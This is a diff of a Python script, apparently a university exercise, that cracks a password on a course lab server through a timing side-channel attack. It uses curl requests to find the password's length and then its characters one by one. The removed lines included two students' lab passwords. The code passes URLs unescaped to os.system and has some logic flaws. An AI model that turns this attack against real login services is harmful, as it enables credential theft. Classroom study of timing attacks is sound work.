@@ -1,12 +1,11 @@
 import os
-import subprocess
 import logging as log
 from time import time
 import time as timer
 import Configurations
-import urllib.request
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
+
 
 # - - - - - - - - - -  LOG SECTION  - - - - - - - - - -
 
@@ -150,7 +149,7 @@ def run_url(url: str) -> None:
     # urllib.request.urlopen(url)
 
     #yarden
-    os.system(url)
+    os.system(url + ">/dev/null 2>&1")
 
     timer.sleep(Configurations.sleep_time)
 
@@ -188,14 +187,37 @@ def check_password_size_thread(url_result_command: str, iterations: int, thread_
     return total_iterations_time
 
 
-def warmup():
+def warmup() -> None:
     """
+    This function run curl for the first time to stabilize the connection time.
 
-    :return:
+    :return: None.
     """
-    url_time_command = 'curl -s -w "%{time_total}" "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"'
     url_time_command = 'curl -s "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"'
-    os.system(url_time_command)
+    run_url(url_time_command)
+
+
+def check_if_distinct(results: list) -> bool:
+    """
+    This function will check if the given list is distinct according to the normal distribution.
+
+    :param results: List. list with values to verify if distinct according to normal distribution.
+
+    :return: Boolean. True if distinct, false otherwise.
+    """
+    # mu = 10
+    # sigma2 = 4
+    #
+    # vector_length = len(results)
+    #
+    # normal_data = np.random.normal(size=vector_length) * sigma2 + mu
+    #
+    # h, p = stats.ttest_ind(normal_data, results)
+    # if p > Configurations.alpha:
+    #     return False
+    # else:
+    #     return True
+    return True
 
 
 def check_password_size(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size, logger=None) -> int:
@@ -216,23 +238,32 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
 
     results = {}
     future_results = []
+    distinct = False
 
-    for i in range(0, max_password_size + 1, 1):
-        url_result_command = f'curl -s "{start_url}{Configurations.default_character * i}{end_url}"'
-        url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
-            time_total='time_total', start_url=start_url, password=Configurations.default_character * i, end_url=end_url)
+    while not distinct:
+        for i in range(0, max_password_size + 1, 1):
+            url_result_command = f'curl -s "{start_url}{Configurations.default_character * i}{end_url}"'
+            url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
+                time_total='time_total', start_url=start_url, password=Configurations.default_character * i, end_url=end_url)
 
+            if Configurations.use_thread_pool:
+                future_results.append(thread_pool.submit(check_password_size_thread, url_result_command, Configurations.attempts, i, logger))
+            else:
+                res = check_password_size_thread(url_result_command, Configurations.attempts, i, logger)
+                results[i] = res
         if Configurations.use_thread_pool:
-            future_results.append(thread_pool.submit(check_password_size_thread, url_result_command, Configurations.attempts, i, logger))
-        else:
-            res = check_password_size_thread(url_result_command, Configurations.attempts, i, logger)
-            results[i] = res
+            thread_pool.shutdown(wait=True)
 
-    if Configurations.use_thread_pool:
-        thread_pool.shutdown(wait=True)
+            for i in range(max_password_size + 1):
+                results[i] = future_results[i].result()
 
-        for i in range(max_password_size + 1):
-            results[i] = future_results[i].result()
+        # check timing results
+        max_value_index = max(results, key=results.get)
+        result_list = list(results.values())
+        result_list.remove(results[max_value_index])
+
+        # check distinct
+        distinct = check_if_distinct(result_list)
 
     password_length = max(results, key=results.get)
     # write_log(logger, log_level="debug", message=f"[check_password_size]: password length is: {password_length}")
@@ -240,7 +271,7 @@ def check_password_size(start_url: str = "", end_url: str = "", max_password_siz
     return password_length
 
 
-def crack_password_thread(url_time_command, url_result_command, ch, current_password, iterations: int=Configurations.attempts, logger=None):
+def crack_password_thread(url_time_command, url_result_command, ch, current_password, iterations: int=1, logger=None):
     """
     This function request the given URL iteration times and sum the requests time and return it.
 
@@ -285,53 +316,79 @@ def crack_password_thread(url_time_command, url_result_command, ch, current_pass
     return ch, total_iterations_time
 
 
-def crack_password(password_size: int, start_url: str = "", end_url: str = "", logger=None):
+def crack_password(password_size: int, start_url: str = "", end_url: str = "", logger=None) -> str:
     """
+    This function get a password size and try to break it by using timing attack.
 
-    :param password_size:
-    :param start_url:
-    :param end_url:
-    :param logger:
-    :return:
+    :param password_size: Int. length of password.
+    :param start_url: String. prefix of the url.
+    :param end_url: String. postfix of the url.
+    :param logger: Logger. if a given, a command will be writen in it.
+
+    :return: String. the pasword that have been found, None if failed to find the password.
     """
-
-    # password = "loohvrjtcblvniyq"   # aviv password - difficulty 1
-    # password = "izxuwlxfktdnbaiv"   # yarden password - difficulty 1
     password = ""
 
     for i in range(password_size - len(password)):
-        if Configurations.use_thread_pool:
-            thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
 
-        results = {}
-        future_results = []
 
-        for ch in Configurations.characters:
+        thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
 
-            current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
-            url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
-                time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
-            url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'
+        if i == password_size - len(password):  # last iteration
+            for ch in Configurations.characters:
+
+                current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
+                url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
+                    time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
+                url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'
+
+
+                future_results.append(
+                    thread_pool.submit(crack_password_thread, url_time_command, url_result_command, ch,
+                                       current_password, Configurations.attempts, logger))
 
             if Configurations.use_thread_pool:
-                future_results.append(thread_pool.submit(crack_password_thread, url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger))
-            else:
-                res = crack_password_thread(url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger)
-                results[ch] = res
+                thread_pool.shutdown(wait=True)
+            break
 
-        if Configurations.use_thread_pool:
-            thread_pool.shutdown(wait=True)
+        distinct = False
 
-            for j in range(len(future_results)):
-                result = future_results[j].result()
-                results[result[0]] = result[1]
+        while not distinct:
+
+            results = {}
+            future_results = []
+
+            for ch in Configurations.characters:
+
+                current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
+                url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
+                    time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
+                url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'
+
+                if Configurations.use_thread_pool:
+                    future_results.append(thread_pool.submit(crack_password_thread, url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger))
+                else:
+                    res = crack_password_thread(url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger)
+                    results[ch] = res
+
+            if Configurations.use_thread_pool:
+                thread_pool.shutdown(wait=True)
+
+                for j in range(len(future_results)):
+                    result = future_results[j].result()
+                    results[result[0]] = result[1]
+
+            # check timing results
+            max_value_index = max(results, key=results.get)
+            result_list = list(results.values())
+            result_list.remove(results[max_value_index])
+
+            # check distinct
+            distinct = check_if_distinct(result_list)
 
         max_time_char = max(results, key=results.get)
 
         password += max_time_char
-        # write_log(logger, log_level="debug", message=f"[crack password][iter {i}]: chosen letter if: {max_time_char}, time: {results[max_time_char]} (current password is '{password}).')")
-
-    # write_log(logger, log_level="debug", message=f"[crack password]: password found: {password}   .")
 
     return Configurations.password if Configurations.password != "" else None
 
